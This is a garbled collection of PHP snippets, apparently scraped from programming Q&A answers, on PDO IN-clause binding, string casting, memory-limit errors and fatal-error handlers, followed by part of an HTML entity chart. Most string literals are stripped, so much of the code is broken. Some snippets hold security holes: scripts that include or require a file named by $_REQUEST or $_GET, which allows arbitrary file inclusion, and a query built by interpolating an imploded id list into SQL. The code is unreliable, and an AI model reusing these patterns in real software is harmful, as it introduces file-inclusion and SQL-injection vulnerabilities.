/** * mysql::pdo_query( * * @param $query * @param $params */ function pdo_query($query, $params = array()){ if(!$query) trigger_error( $in_fields = array(); foreach($params as $field => $value){ if(is_array($value)){ for($i=0,$size=sizeof($value);$i<$size;$i++) $in_array[] = $field.$i; $query = str_replace($field, "(".implode( $in_fields[$field] = $value; unset($params[$field]); } } $query_obj = $this->pdo_link->prepare($query); $query_obj->setFetchMode(PDO::FETCH_ASSOC); foreach($params as $field => $value) $query_obj->bindValue($field, $value); foreach($in_fields as $field => $value){ for($i=0,$size=sizeof($value);$i<$size;$i++) $query_obj->bindValue($field.$i, $value[$i]); } $query_obj->execute(); if($query_obj->rowCount() <= 0) return null; return $query_obj; }
<?php $ids = array(1, 2, 3, 7, 8, 9); $inQuery = implode( $db = new PDO(...); $stmt = $db->prepare( FROM table WHERE id IN( ); foreach ($ids as $k => $id) $stmt->bindValue(($k+1), $id); $stmt->execute(); ?>
<?php $ids=array(1,2,3,7,8,9); $db = new PDO(...); $stmt = $db->prepare( FROM table WHERE id = ANY (:an_array)' ); $stmt->bindParam( $stmt->execute(); ?>
$dirtyArray = [ $params = array_combine( array_map( function ($v) {return ":name_{$v}";}, array_keys($dirtyArray) ), $dirtyArray ); $query = "SELECT * FROM user WHERE name IN( " . implode(",", array_keys($params)) . " )"; $stmt = $db->prepare($query); $stmt->execute($params);
$newparams = array(); foreach ($ids as $n => $val){ $newparams[] = ":id_$n"; } try { $stmt = $conn->prepare("DELETE FROM $table WHERE ($table.id IN (" . implode(", ",$newparams). "))"); foreach ($ids as $n => $val){ $stmt->bindParam(":id_$n", intval($val), PDO::PARAM_INT); } $stmt->execute();
$valuevar = (is_float($val) ? floatval($val) : is_int($val) ? intval($val) : is_string($val) ? strval($val) : $val ); $stmt->bindParam(":id_$n", $valuevar, (is_int($val) ? PDO::PARAM_INT : is_string($val) ? PDO::PARAM_STR : NULL ));
$sql = "SELECT * FROM table WHERE id IN ($whereIn)";
class Db extends PDO { /** * SELECT ... WHERE fieldName IN (:paramName) workaround * * @param array $array * @param string $prefix * * @return string */ public function CreateArrayBindParamNames(array $array, $prefix = { $newparams = []; foreach ($array as $n => $val) { $newparams[] = ":".$prefix.$n; } return implode(", ", $newparams); } /** * Bind every array element to the proper named parameter * * @param PDOStatement $stmt * @param array $array * @param string $prefix */ public function BindArrayParam(PDOStatement &$stmt, array $array, $prefix = { foreach($array as $n => $val) { $val = intval($val); $stmt -> bindParam(":".$prefix.$n, $val, PDO::PARAM_INT); } } }
$idList = [1, 2, 3, 4]; $stmt = $this -> db -> prepare(" SELECT `Name` FROM `User` WHERE (`ID` IN (".$this -> db -> CreateArrayBindParamNames($idList)."))"); $this -> db -> BindArrayParam($stmt, $idList); $stmt -> execute(); foreach($stmt as $row) { echo $row[ }
$listOfIds = implode( $stmt = $db->prepare( "SELECT * FROM table WHERE id IN($listOfIds)" ); $stmt->execute();
<?php $ids = array(1,2,3,7,8,9); $sqlAnArray = join( array_map( function($index) { return ":an_array_$index"; }, array_keys($ids) ) ); $db = new PDO( ); $stmt = $db->prepare( FROM table WHERE id IN( ); foreach ($ids as $index => $id) { $stmt->bindValue("an_array_$index", $id); }
foreach ($ids as $index => $id) { $stmt->bindParam("an_array_$index", $ids[$id]); }
<?php $ids = array(1,2,3,7,8,9); $sqlAnArray = $db = new PDO( ); $stmt = $db->prepare( FROM phone_number_lookup WHERE country_code IN( ); $stmt->execute($ids);
foreach($array as $key=>$value) { $in_query = $in_query . } $in_query = substr($in_query, 0, -2); $stmt = $db->prepare( "SELECT * WHERE id IN($in_query)"; foreach ($array as $key=>$value) { $stmt->bindParam(":val_" . $key, $array[$key]) } $stmt->execute();
require $db=new dbConnect(); $array=[]; array_push($array, array_push($array, $query="SELECT * FROM sites WHERE kind IN ("; foreach ($array as $field){ $query.="?,"; } $query=substr($query,0,strlen($query)-1); $query.=")"; $tbl=$db->connection->prepare($query); for($i=1;$i<=count($array);$i++) $tbl->bindParam($i,$array[$i-1],PDO::PARAM_STR); $tbl->execute(); $row=$tbl->fetchAll(PDO::FETCH_OBJ); var_dump($row);
$strvar = (string) $var; echo $var; var_dump($var);
class Bottles { public function __toString() { return } } $ex = new Bottles; var_dump($ex, (string) $ex);
$i = 1; var_dump((int) $i); var_dump((bool) $i); var_dump((string) 1);
<?php ob_start(); var_dump($someVar); $result = ob_get_clean(); ?>
<?php $foo = "5bar"; $bar = true; settype($foo, "integer"); settype($bar, "string"); ?>
function castToString($instance) { if (is_object($instance) && method_exists($instance, return call_user_func_array(array($instance, } }
$no = 077543 $str = (string)$no; $str = "$no"; $str = print_r($no,true); $str = strval($no); $str = settype($no, "integer");
$parent_category_name = "new clothes & shoes" ; $parent_category = strval($parent_category_name); $parent_category = "
$my_std_obj_result = $SomeResponse->return->data; $my_string_result = implode ((array)$my_std_obj_result);
String myText = (string)myVar; $myText = (string) $myVar;
String myText = String.valueOf(myVar); $var = strval($varname);
class SomeClass{ public String toString(){ return this.s + " | " + this.i + " | " + pi; } } class SomeClass{ public function __toString() { return } }
$no = 077543 $str = "$no"; $str = print_r($no,true); $str = settype($no,
Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 54 bytes)
$fh = fopen($myfile); while (!feof($fh)) { array_push($file, stripslashes(fgets($fh))); } fclose($fh);
function exhaustYourBytes() { return exhaustYourBytes(); }
; Determines the size of the realpath cache to be used by PHP. This value should ; be increased on systems where PHP opens many files to reflect the quantity of ; the file operations performed. ; http: realpath_cache_size = 16k ; Duration of time, in seconds for which to cache realpath information for a given ; file or directory. For systems with rarely changing files, consider increasing this ; value. ; http: realpath_cache_ttl = 120
; Maximum amount of memory a script may consume (128MB) ; http: memory_limit = 128M
; Maximum amount of memory a script may consume (128MB) ; http: memory_limit = 512M
class Proxy { private $actualObject; public function doSomething() { return $this->actualObjec->doSomething(); } }
total used free shared buffers cached Mem: 64457 63791 666 0 1118 18273 -/+ buffers/cache: 44398 20058 Swap: 1021 0 1021
Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 4096 bytes) in C:\\workspace\image_management.php on line 173
set_include_path(get_include_path() . get_include_path().
register_shutdown_function( "fatal_handler" ); function fatal_handler() { $errfile = "unknown file"; $errstr = "shutdown"; $errno = E_CORE_ERROR; $errline = 0; $error = error_get_last(); if( $error !== NULL) { $errno = $error["type"]; $errfile = $error["file"]; $errline = $error["line"]; $errstr = $error["message"]; error_mail(format_error( $errno, $errstr, $errfile, $errline)); } }
function format_error( $errno, $errstr, $errfile, $errline ) { $trace = print_r( debug_backtrace( false ), true ); $content = " <table> <thead><th>Item</th><th>Description</th></thead> <tbody> <tr> <th>Error</th> <td><pre>$errstr</pre></td> </tr> <tr> <th>Errno</th> <td><pre>$errno</pre></td> </tr> <tr> <th>File</th> <td>$errfile</td> </tr> <tr> <th>Line</th> <td>$errline</td> </tr> <tr> <th>Trace</th> <td><pre>$trace</pre></td> </tr> </tbody> </table>"; return $content; }
function shutDownFunction() { $error = error_get_last(); if ($error[ } } register_shutdown_function(
ob_start( function fatal_error_handler($buffer){ $error=error_get_last(); if($error[ $newBuffer= <style> .error_content{ background: ghostwhite; vertical-align: middle; margin:0 auto; padding:10px; width:50%; } .error_content label{color: red;font-family: Georgia;font-size: 16pt;font-style: italic;} .error_content ul li{ background: none repeat scroll 0 0 FloralWhite; border: 1px solid AliceBlue; display: block; font-family: monospace; padding: 2%; text-align: left; } </style> <body style="text-align: center;"> <div class="error_content"> <label >Fatal Error </label> <ul> <li><b>Line</b> <li><b>Message</b> <li><b>File</b> </ul> <a href="javascript:history.back()"> Back </a> </div> </body></html> return $newBuffer; } return $buffer; }
<?php define( E_COMPILE_ERROR | E_RECOVERABLE_ERROR); define( define( define( define( register_shutdown_function( set_error_handler( function shut(){ $error = error_get_last(); if($error && ($error[ handler($error[ } } function handler( $errno, $errstr, $errfile, $errline ) { switch ($errno){ case E_ERROR: $typestr = case E_WARNING: $typestr = case E_PARSE: $typestr = case E_NOTICE: $typestr = case E_CORE_ERROR: $typestr = case E_CORE_WARNING: $typestr = case E_COMPILE_ERROR: $typestr = case E_CORE_WARNING: $typestr = case E_USER_ERROR: $typestr = case E_USER_WARNING: $typestr = case E_USER_NOTICE: $typestr = case E_STRICT: $typestr = case E_RECOVERABLE_ERROR: $typestr = case E_DEPRECATED: $typestr = case E_USER_DEPRECATED: $typestr = } $message = if(($errno & E_FATAL) && ENV === header( header( } if(!($errno & ERROR_REPORTING)) return; if(DISPLAY_ERRORS) printf( if(LOG_ERRORS) error_log(strip_tags($message), 0); } ob_start(); @include ob_end_flush(); ?>
function __fatalHandler() { $error = error_get_last(); if ($error !== NULL && in_array($error[ echo "<pre>fatal error:\n"; print_r($error); echo "</pre>"; die; } } register_shutdown_function(
<?php function shutdown() { if (($error = error_get_last())) { ob_clean(); throw new Exception("fatal error"); } } try { $x = null; $x->method() } catch(Exception $e) { } ?>
<?php function shutdown() { if (($error = error_get_last())) { ob_clean(); header("Location: http: } } register_shutdown_function( $x = null; $x->method() ?>
<?php function exception_error_handler($errno, $errstr, $errfile, $errline ) { throw new ErrorException($errstr, $errno, 0, $errfile, $errline); } set_error_handler("exception_error_handler"); try { } catch(ErrorException $e) { } ?>
<?php $variable = try { $variable->method(); } catch (Error $e) { echo $e->getMessage(); }
<?php try { undefinedFunctionCall(); } catch (Throwable $e) { echo $e->getMessage(); }
/** * ErrorHandler that can be used to catch internal PHP errors * and convert to an ErrorException instance. */ abstract class ErrorHandler { /** * Active stack * * @var array */ protected static $stack = array(); /** * Check if this error handler is active * * @return bool */ public static function started() { return (bool) static::getNestedLevel(); } /** * Get the current nested level * * @return int */ public static function getNestedLevel() { return count(static::$stack); } /** * Starting the error handler * * @param int $errorLevel */ public static function start($errorLevel = \E_WARNING) { if (!static::$stack) { set_error_handler(array(get_called_class(), } static::$stack[] = null; } /** * Stopping the error handler * * @param bool $throw Throw the ErrorException if any * @return null|ErrorException * @throws ErrorException If an error has been catched and $throw is true */ public static function stop($throw = false) { $errorException = null; if (static::$stack) { $errorException = array_pop(static::$stack); if (!static::$stack) { restore_error_handler(); } if ($errorException && $throw) { throw $errorException; } } return $errorException; } /** * Stop all active handler * * @return void */ public static function clean() { if (static::$stack) { restore_error_handler(); } static::$stack = array(); } /** * Add an error to the stack * * @param int $errno * @param string $errstr * @param string $errfile * @param int $errline * @return void */ public static function addError($errno, $errstr = { $stack = & static::$stack[count(static::$stack) - 1]; $stack = new ErrorException($errstr, 0, $errno, $errfile, $errline, $stack); } }
ErrorHandler::start(E_WARNING); $return = call_function_raises_E_WARNING(); if ($innerException = ErrorHandler::stop()) { throw new Exception( } ErrorHandler::stop(true);
class ErrorHandler { public function registerExceptionHandler($level = null, $callPrevious = true) { $prev = set_exception_handler(array($this, $this->uncaughtExceptionLevel = $level; if ($callPrevious && $prev) { $this->previousExceptionHandler = $prev; } } public function registerErrorHandler(array $levelMap = array(), $callPrevious = true, $errorTypes = -1) { $prev = set_error_handler(array($this, $this->errorLevelMap = array_replace($this->defaultErrorLevelMap(), $levelMap); if ($callPrevious) { $this->previousErrorHandler = $prev ?: true; } } public function registerFatalHandler($level = null, $reservedMemorySize = 20) { register_shutdown_function(array($this, $this->reservedMemory = str_repeat( $this->fatalLevel = $level; } }
function fatal_error_handler() { if (@is_array($e = @error_get_last())) { $code = isset($e[ $msg = isset($e[ $file = isset($e[ $line = isset($e[ if ($code>0) error_handler($code,$msg,$file,$line); } } set_error_handler("error_handler"); register_shutdown_function(
<?php register_shutdown_function( function __fatalHandler() { $error = error_get_last(); if($error !== NULL && $error[ function fakeHandler() { } $handler = set_exception_handler( restore_exception_handler(); if($handler !== null) { call_user_func($handler, new ErrorException($error[ } exit; } } ?>
function errorHandler($errno, $errstr, $errfile = } function fatalHandler() { $error = error_get_last(); if($error) errorHandler($error["type"], $error["message"], $error["file"], $error["line"]); } set_error_handler("errorHandler") register_shutdown_function("fatalHandler");
class PHPFatalError { public function setHandler() { register_shutdown_function( } } function handleShutdown() { if (($error = error_get_last())) { ob_start(); echo "<pre>"; var_dump($error); echo "</pre>"; $message = ob_get_clean(); sendEmail($message); ob_start(); echo ob_flush(); exit(); } }
function superTryCatchFinallyAndExit( Closure $try, Closure $catch = NULL, Closure $finally ) { $finished = FALSE; register_shutdown_function( function() use ( &$finished, $catch, $finally ) { if( ! $finished ) { $finished = TRUE; print "EXPLODE!".PHP_EOL; if( $catch ) { superTryCatchFinallyAndExit( function() use ( $catch ) { $catch( new Exception( "Fatal Error!!!" ) ); }, NULL, $finally ); } else { $finally(); } } } ); try { $try(); } catch( Exception $e ) { if( $catch ) { try { $catch( $e ); } catch( Exception $e ) {} } } $finished = TRUE; $finally(); exit(); }
php_flag display_errors on php_value error_reporting 2039
$test_server = $_SERVER[ ini_set( error_reporting(E_ALL|E_STRICT);
error_reporting(E_ALL | E_STRICT); ini_set( ini_set(
function dump_error_to_file($errno, $errstr) { file_put_contents( } set_error_handler(
switch($_SERVER[ { case case ini_set( error_reporting(E_ALL); break; case break; }
[Sun Apr 19 19:09:11 2009] [error] [client 127.0.0.1] PHP Parse error: syntax error, unexpected T_ENCAPSED_AND_WHITESPACE, expecting T_STRING or T_VARIABLE or T_NUM_STRING in D:\\webroot\\test\\test.php on line 9
error_reporting(E_ALL); ini_set("display_errors", 1);
mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
$pdo = new PDO( PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION ]);
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
<?php error_reporting(-1); ini_set( include($_REQUEST[ ?>
$sc = $_GET["sc"]; if ((!isset($_GET["sc"]) && empty($_GET["sc"]))) { echo "Please select file to execute using ?sc= (you may omit the .PHP-extension)"; } else { $sc = $_GET["sc"]; if (false==stripos( require($sc); } ?>
<?php $isodate = sprintf("%04d-%02d-%02d", $year, $month, $day); ?>
function formatSeconds($secs) { $result = $seconds = intval($secs) % 60; $minutes = (intval($secs) / 60) % 60; $hours = (intval($secs) / 3600) % 24; $days = intval(intval($secs) / (3600*24)); if ($days > 0) { $result = str_pad($days, 2, } if(($hours > 0) || ($result!="")) { $result .= str_pad($hours, 2, } if (($minutes > 0) || ($result!="")) { $result .= str_pad($minutes, 2, } $result .= str_pad($seconds, 2, return $result; }
echo formatSeconds(15); echo formatSeconds(100); echo formatSeconds(10800); echo formatSeconds(10000000);
function duration($time){ $hours = $minutes = $seconds = if($time >= 3600){ $hours = floor($time / 3600); $hours = str_pad($hours, 2, $time = $time % 3600; } if($time >= 60){ $minutes = floor($time / 60); $minutes = str_pad($minutes, 2, $time = $time % 60; } if($time){ $seconds = str_pad($time, 2, } return $hours . $minutes . $seconds; } echo duration(59); echo duration(590); echo duration(5900);
find . -name "*.php" -print0 | xargs -0 perl -pi -e
find . -name "*.php" -print0 | xargs -0 perl -pi -e
[1] => Altisoxxce Soluxxons S.à r.l. [5] => Joxxson & Joxxson
**HTML Character Entity Reference Chart at W3.org**
&Tab; &NewLine; ! &excl; " &quot; &QUOT; # &num; $ &dollar; % &percnt; & &amp; &AMP; ' &apos; ( &lpar; ) &rpar; * &ast; &midast; + &plus; , &comma; . &period; / &sol; : &colon; ; &semi; < &lt; &LT; = &equals; > &gt; &GT; ? &quest; @ &commat; [ &lsqb; &lbrack; \ &bsol; ] &rsqb; &rbrack; ^ &Hat; _ &lowbar; ` &grave; &DiacriticalGrave; { &lcub; &lbrace; | &verbar; &vert; &VerticalLine; } &rcub; &rbrace; &nbsp; &NonBreakingSpace; ¡ &iexcl; ¢ &cent; £ &pound; ¤ &curren; ¥ &yen; ¦ &brvbar; § &sect; ¨ &Dot; &die; &DoubleDot; &uml; © &copy; &COPY; ª &ordf; « &laquo; ¬ &not; &shy; ® &reg; &circledR; &REG; ¯ &macr; &OverBar; &strns; ° &deg; ± &plusmn; &pm; &PlusMinus; ² &sup2; ³ &sup3; ´ &acute; &DiacriticalAcute; µ &micro; ¶ &para; · &middot; &centerdot; &CenterDot; ¸ &cedil; &Cedilla; ¹ &sup1; º &ordm; » &raquo; ¼ &frac14; ½ &frac12; &half; ¾ &frac34; ¿ &iquest; À &Agrave; Á &Aacute; Â &Acirc; Ã &Atilde; Ä &Auml; Å &Aring; Æ &AElig; Ç &Ccedil; È &Egrave; É &Eacute; Ê &Ecirc; Ë &Euml; Ì &Igrave; Í &Iacute; Î &Icirc; Ï &Iuml; Ð &ETH; Ñ &Ntilde; Ò &Ograve; Ó &Oacute; Ô &Ocirc; Õ &Otilde; Ö &Ouml; × &times; Ø &Oslash; Ù &Ugrave; Ú &Uacute; Û &Ucirc; Ü &Uuml; Ý &Yacute; Þ &THORN; ß &szlig; à &agrave; á &aacute; â &acirc; ã &atilde; ä &auml; å &aring; æ &aelig; ç &ccedil; è &egrave; é &eacute; ê &ecirc; ë &euml; ì &igrave; í &iacute; î &icirc; ï &iuml; ð &eth; ñ &ntilde; ò &ograve; ó &oacute; ô &ocirc; õ &otilde; ö &ouml; ÷ &divide; &div; ø &oslash; ù &ugrave; ú &uacute; û &ucirc; ü &uuml; ý &yacute; þ &thorn; ÿ &yuml; Ā &Amacr; ā &amacr; Ă &Abreve; ă &abreve; Ą &Aogon; ą &aogon; Ć &Cacute; ć &cacute; Ĉ &Ccirc; ĉ &ccirc; Ċ &Cdot; ċ &cdot; Č &Ccaron; č &ccaron; Ď &Dcaron; ď &dcaron; Đ &Dstrok; đ &dstrok; Ē &Emacr; ē &emacr; Ė &Edot; ė &edot; Ę &Eogon; ę &eogon; Ě &Ecaron; ě &ecaron; Ĝ &Gcirc; ĝ &gcirc; Ğ &Gbreve; ğ &gbreve; Ġ &Gdot; ġ &gdot; Ģ &Gcedil; Ĥ &Hcirc; ĥ &hcirc; Ħ &Hstrok; ħ &hstrok; Ĩ &Itilde; ĩ &itilde; Ī &Imacr; ī &imacr; Į &Iogon; į &iogon; İ &Idot; ı &imath; &inodot; Ĳ &IJlig; ĳ &ijlig; Ĵ &Jcirc; ĵ &jcirc; Ķ &Kcedil; ķ &kcedil; ĸ &kgreen; Ĺ &Lacute; ĺ &lacute; Ļ &Lcedil; ļ &lcedil; Ľ &Lcaron; ľ &lcaron; Ŀ &Lmidot; ŀ &lmidot; Ł &Lstrok; ł &lstrok; Ń &Nacute; ń &nacute; Ņ &Ncedil; ņ &ncedil; Ň &Ncaron; ň &ncaron; ŉ &napos; Ŋ &ENG; ŋ &eng; Ō &Omacr; ō &omacr; Ő &Odblac; ő &odblac; Œ &OElig; œ &oelig; Ŕ &Racute; ŕ &racute; Ŗ &Rcedil; ŗ &rcedil; Ř &Rcaron; ř &rcaron; Ś &Sacute; ś &sacute; Ŝ &Scirc; ŝ &scirc; Ş &Scedil; ş &scedil; Š &Scaron; š &scaron; Ţ &Tcedil; ţ &tcedil; Ť &Tcaron; ť &tcaron; Ŧ &Tstrok; ŧ &tstrok; Ũ &Utilde; ũ &utilde; Ū &Umacr; ū &umacr; Ŭ &Ubreve; ŭ &ubreve; Ů &Uring; ů &uring; Ű &Udblac; ű &udblac; Ų &Uogon; ų &uogon; Ŵ &Wcirc; ŵ &wcirc; Ŷ &Ycirc; ŷ &ycirc; Ÿ &Yuml; Ź &Zacute; ź &zacute; Ż &Zdot; ż &zdot; Ž &Zcaron; ž &zcaron; ƒ &fnof; Ƶ &imped; ǵ &gacute; ȷ &jmath; ˆ &circ; ˇ &caron; &Hacek; ˘ &breve; &Breve; ˙ &dot; &DiacriticalDot; ˚ &ring; ˛ &ogon; ˜ &tilde; &DiacriticalTilde; ˝ &dblac; &DiacriticalDoubleAcute; ̑ &DownBreve; ̲ &UnderBar; Α &Alpha; Β &Beta; Γ &Gamma; Δ &Delta; Ε &Epsilon; Ζ &Zeta; Η &Eta; Θ &Theta; Ι &Iota; Κ &Kappa; Λ &Lambda; Μ &Mu; Ν &Nu; Ξ &Xi; Ο &Omicron; Π &Pi; Ρ &Rho; Σ &Sigma; Τ &Tau; Υ &Upsilon; Φ &Phi; Χ &Chi; Ψ &Psi; Ω &Omega; α &alpha; β &beta; γ &gamma; δ &delta; ε &epsiv; &varepsilon; &epsilon; ζ &zeta; η &eta; θ &theta; ι &iota; κ &kappa; λ &lambda; μ &mu; ν &nu; ξ &xi; ο &omicron; π &pi; ρ &rho; ς &sigmav; &varsigma; &sigmaf; σ &sigma; τ &tau; υ &upsi; &upsilon; φ &phi; &phiv; &varphi; χ &chi; ψ &psi; ω &omega; ϑ &thetav; &vartheta; &thetasym; ϒ &Upsi; &upsih; ϕ &straightphi; ϖ &piv; &varpi; Ϝ &Gammad; ϝ &gammad; &digamma; ϰ &kappav; &varkappa; ϱ &rhov; &varrho; ϵ &epsi; &straightepsilon; ϶ &bepsi; &backepsilon; Ё &IOcy; Ђ &DJcy; Ѓ &GJcy; Є &Jukcy; Ѕ &DScy; І &Iukcy; Ї &YIcy; Ј &Jsercy; Љ &LJcy; Њ &NJcy; Ћ &TSHcy; Ќ &KJcy; Ў &Ubrcy; Џ &DZcy; А &Acy; Б &Bcy; В &Vcy; Г &Gcy; Д &Dcy; Е &IEcy; Ж &ZHcy; З &Zcy; И &Icy; Й &Jcy; К &Kcy; Л &Lcy; М &Mcy; Н &Ncy; О &Ocy; П &Pcy; Р &Rcy; С &Scy; Т &Tcy; У &Ucy; Ф &Fcy; Х &KHcy; Ц &TScy; Ч &CHcy; Ш &SHcy; Щ &SHCHcy; Ъ &HARDcy; Ы &Ycy; Ь &SOFTcy; Э &Ecy; Ю &YUcy; Я &YAcy; а &acy; б &bcy; в &vcy; г &gcy; д &dcy; е &iecy; ж &zhcy; з &zcy; и &icy; й &jcy; к &kcy; л &lcy; м &mcy; н &ncy; о &ocy; п &pcy; р &rcy; с &scy; т &tcy; у &ucy; ф &fcy; х &khcy; ц &tscy; ч &chcy; ш &shcy; щ &shchcy; ъ &hardcy; ы &ycy; ь &softcy; э &ecy; ю &yucy; я &yacy; ё &iocy; ђ &djcy; ѓ &gjcy; є &jukcy; ѕ &dscy; і &iukcy; ї &yicy; ј &jsercy; љ &ljcy; њ &njcy; ћ &tshcy; ќ &kjcy; ў &ubrcy; џ &dzcy; &ensp; &emsp; &emsp13; &emsp14; &numsp; &puncsp; &thinsp; &ThinSpace; &hairsp; &VeryThinSpace; ​ &ZeroWidthSpace; &NegativeVeryThinSpace; &NegativeThinSpace; &NegativeMediumSpace; &NegativeThickSpace; ‌ &zwnj; ‍ &zwj; ‎ &lrm; ‏ &rlm; ‐ &hyphen; &dash; – &ndash; — &mdash; ― &horbar; ‖ &Verbar; &Vert; ‘ &lsquo; &OpenCurlyQuote; ’ &rsquo; &rsquor; &CloseCurlyQuote; ‚ &lsquor; &sbquo; “ &ldquo; &OpenCurlyDoubleQuote; ” &rdquo; &rdquor; &CloseCurlyDoubleQuote; „ &ldquor; &bdquo; † &dagger; ‡ &Dagger; &ddagger; • &bull; &bullet; ‥ &nldr; … &hellip; &mldr; ‰ &permil; ‱ &pertenk; ′ &prime; ″ &Prime; ‴ &tprime; ‵ &bprime; &backprime; ‹ &lsaquo; › &rsaquo; ‾ &oline; ⁁ &caret; ⁃ &hybull; ⁄ &frasl; ⁏ &bsemi; ⁗ &qprime; &MediumSpace; ⁠ &NoBreak; ⁡ &ApplyFunction; &af; ⁢ &InvisibleTimes; &it; ⁣ &InvisibleComma; &ic; € &euro; ⃛ &tdot; &TripleDot; ⃜ &DotDot; ℂ &Copf; &complexes; ℅ &incare; ℊ &gscr; ℋ &hamilt; &HilbertSpace; &Hscr; ℌ &Hfr; &Poincareplane; ℍ &quaternions; &Hopf; ℎ &planckh; ℏ &planck; &hbar; &plankv; &hslash; ℐ &Iscr; &imagline; ℑ &image; &Im; &imagpart; &Ifr; ℒ &Lscr; &lagran; &Laplacetrf; ℓ &ell; ℕ &Nopf; &naturals; № &numero; ℗ &copysr; ℘ &weierp; &wp; ℙ &Popf; &primes; ℚ &rationals; &Qopf; ℛ &Rscr; &realine; ℜ &real; &Re; &realpart; &Rfr; ℝ &reals; &Ropf; ℞ &rx; ™ &trade; &TRADE; ℤ &integers; &Zopf; Ω &ohm; ℧ &mho; ℨ &Zfr; &zeetrf; ℩ &iiota; Å &angst; ℬ &bernou; &Bernoullis; &Bscr; ℭ &Cfr; &Cayleys; ℯ &escr; ℰ &Escr; &expectation; ℱ &Fscr; &Fouriertrf; ℳ &phmmat; &Mellintrf; &Mscr; ℴ &order; &orderof; &oscr; ℵ &alefsym; &aleph; ℶ &beth; ℷ &gimel; ℸ &daleth; ⅅ &CapitalDifferentialD; &DD; ⅆ &DifferentialD; &dd; ⅇ &ExponentialE; &exponentiale; &ee; ⅈ &ImaginaryI; &ii; ⅓ &frac13; ⅔ &frac23; ⅕ &frac15; ⅖ &frac25; ⅗ &frac35; ⅘ &frac45; ⅙ &frac16; ⅚ &frac56; ⅛ &frac18; ⅜ &frac38; ⅝ &frac58; ⅞ &frac78; ← &larr; &leftarrow; &LeftArrow; &slarr; &ShortLeftArrow; ↑ &uarr; &uparrow; &UpArrow; &ShortUpArrow; → &rarr; &rightarrow; &RightArrow; &srarr; &ShortRightArrow; ↓ &darr; &downarrow; &DownArrow; &ShortDownArrow; ↔ &harr; &leftrightarrow; &LeftRightArrow; ↕ &varr; &updownarrow; &UpDownArrow; ↖ &nwarr; &UpperLeftArrow; &nwarrow; ↗ &nearr; &UpperRightArrow; &nearrow; ↘ &searr; &searrow; &LowerRightArrow; ↙ &swarr; &swarrow; &LowerLeftArrow; ↚ &nlarr; &nleftarrow; ↛ &nrarr; &nrightarrow; ↝ &rarrw; &rightsquigarrow; ↞ &Larr; &twoheadleftarrow; ↟ &Uarr; ↠ &Rarr; &twoheadrightarrow; ↡ &Darr; ↢ &larrtl; &leftarrowtail; ↣ &rarrtl; &rightarrowtail; ↤ &LeftTeeArrow; &mapstoleft; ↥ &UpTeeArrow; &mapstoup; ↦ &map; &RightTeeArrow; &mapsto; ↧ &DownTeeArrow; &mapstodown; ↩ &larrhk; &hookleftarrow; ↪ &rarrhk; &hookrightarrow; ↫ &larrlp; &looparrowleft; ↬ &rarrlp; &looparrowright; ↭ &harrw; &leftrightsquigarrow; ↮ &nharr; &nleftrightarrow; ↰ &lsh; &Lsh; ↱ &rsh; &Rsh; ↲ &ldsh; ↳ &rdsh; ↵ &crarr; ↶ &cularr; &curvearrowleft; ↷ &curarr; &curvearrowright; ↺ &olarr; &circlearrowleft; ↻ &orarr; &circlearrowright; ↼ &lharu; &LeftVector; &leftharpoonup; ↽ &lhard; &leftharpoondown; &DownLeftVector; ↾ &uharr; &upharpoonright; &RightUpVector; ↿ &uharl; &upharpoonleft; &LeftUpVector; ⇀ &rharu; &RightVector; &rightharpoonup; ⇁ &rhard; &rightharpoondown; &DownRightVector; ⇂ &dharr; &RightDownVector; &downharpoonright; ⇃ &dharl; &LeftDownVector; &downharpoonleft; ⇄ &rlarr; &rightleftarrows; &RightArrowLeftArrow; ⇅ &udarr; &UpArrowDownArrow; ⇆ &lrarr; &leftrightarrows; &LeftArrowRightArrow; ⇇ &llarr; &leftleftarrows; ⇈ &uuarr; &upuparrows; ⇉ &rrarr; &rightrightarrows; ⇊ &ddarr; &downdownarrows; ⇋ &lrhar; &ReverseEquilibrium; &leftrightharpoons; ⇌ &rlhar; &rightleftharpoons; &Equilibrium; ⇍ &nlArr; &nLeftarrow; ⇎ &nhArr; &nLeftrightarrow; ⇏ &nrArr; &nRightarrow; ⇐ &lArr; &Leftarrow; &DoubleLeftArrow; ⇑ &uArr; &Uparrow; &DoubleUpArrow; ⇒ &rArr; &Rightarrow; &Implies; &DoubleRightArrow; ⇓ &dArr; &Downarrow; &DoubleDownArrow; ⇔ &hArr; &Leftrightarrow; &DoubleLeftRightArrow; &iff; ⇕ &vArr; &Updownarrow; &DoubleUpDownArrow; ⇖ &nwArr; ⇗ &neArr; ⇘ &seArr; ⇙ &swArr; ⇚ &lAarr; &Lleftarrow; ⇛ &rAarr; &Rrightarrow; ⇝ &zigrarr; ⇤ &larrb; &LeftArrowBar; ⇥ &rarrb; &RightArrowBar; ⇵ &duarr; &DownArrowUpArrow; ⇽ &loarr; ⇾ &roarr; ⇿ &hoarr; ∀ &forall; &ForAll; ∁ &comp; &complement; ∂ &part; &PartialD; ∃ &exist; &Exists; ∄ &nexist; &NotExists; &nexists; ∅ &empty; &emptyset; &emptyv; &varnothing; ∇ &nabla; &Del; ∈ &isin; &isinv; &Element; &in; ∉ &notin; &NotElement; &notinva; ∋ &niv; &ReverseElement; &ni; &SuchThat; ∌ &notni; &notniva; &NotReverseElement; ∏ &prod; &Product; ∐ &coprod; &Coproduct; ∑ &sum; &Sum; − &minus; ∓ &mnplus; &mp; &MinusPlus; ∔ &plusdo; &dotplus; ∖ &setmn; &setminus; &Backslash; &ssetmn; &smallsetminus; ∗ &lowast; ∘ &compfn; &SmallCircle; √ &radic; &Sqrt; ∝ &prop; &propto; &Proportional; &vprop; &varpropto; ∞ &infin; ∟ &angrt; ∠ &ang; &angle; ∡ &angmsd; &measuredangle; ∢ &angsph; ∣ &mid; &VerticalBar; &smid; &shortmid; ∤ &nmid; &NotVerticalBar; &nsmid; &nshortmid; ∥ &par; &parallel; &DoubleVerticalBar; &spar; &shortparallel; ∦ &npar; &nparallel; &NotDoubleVerticalBar; &nspar; &nshortparallel; ∧ &and; &wedge; ∨ &or; &vee; ∩ &cap; ∪ &cup; ∫ &int; &Integral; ∬ &Int; ∭ &tint; &iiint; ∮ &conint; &oint; &ContourIntegral; ∯ &Conint; &DoubleContourIntegral; ∰ &Cconint; ∱ &cwint; ∲ &cwconint; &ClockwiseContourIntegral; ∳ &awconint; &CounterClockwiseContourIntegral; ∴ &there4; 